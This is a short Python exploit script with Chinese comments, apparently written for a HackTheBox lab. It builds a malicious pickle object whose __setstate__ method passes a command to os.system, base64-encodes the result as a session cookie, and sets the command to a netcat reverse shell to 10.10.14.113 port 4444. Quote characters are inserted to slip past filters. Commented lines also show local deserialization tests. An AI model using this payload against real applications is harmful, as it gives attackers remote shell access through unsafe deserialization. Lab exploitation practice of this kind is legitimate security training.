import pickle
import base64
import os
import util.auth

# 定义一个恶意类
class Malicious:
    def __setstate__(self, state):
        # state 是一个字典，从 pickle 数据中恢复
        # cmd = state.get('cmd', 'echo No cmd provided')
        # print("__setstate__ 被调用，正在执行系统命令...")
        os.system(state['cmd'])  # 这里执行任意系统命令！

# # 创建一个实例（不调用 __init__，直接设置 state）
# malicious_instance = Malicious.__new__(Malicious)  # 绕过 __init__
# state_dict = {'cmd': 'ping -c 5 127.0.0.1'}  # 无害测试命令（ping 本地，避免真实攻击）
# # 手动调用 __setstate__ 演示（模拟反序列化过程）
# malicious_instance.__setstate__(state_dict)

# 真实攻击场景：序列化一个包含 state 的实例
real_instance = Malicious()
# real_instance.__dict__ = {'cmd': 'ping -c 3 10.10.14.113'}  # 直接设置 __dict__
# real_instance.__dict__ = {'cmd': "n'c' -nv 127.0.0.1 4444 -e /bin/s'h'"}
real_instance.__dict__ = {'cmd': "n'c' -nv 10.10.14.113 4444 -e /bin/s'h'"}

# 序列化
cookie = pickle.dumps(real_instance)
cookie = base64.b64encode(cookie)
cookie = cookie.decode()
print(f"Cookie ---> {cookie}")

# # 本地测试1：反序列化（这会触发 __setstate__ 执行命令）
# print("\n开始反序列化...")
# recovered = pickle.loads(cookie)  # <-- 这里会执行 os.system

# 本地测试2
# util.auth.cookieToSession(cookie) # OK, No Problem, 但是就是不能成功在 HackTheBox Lab 中执行远程命令, 奇怪...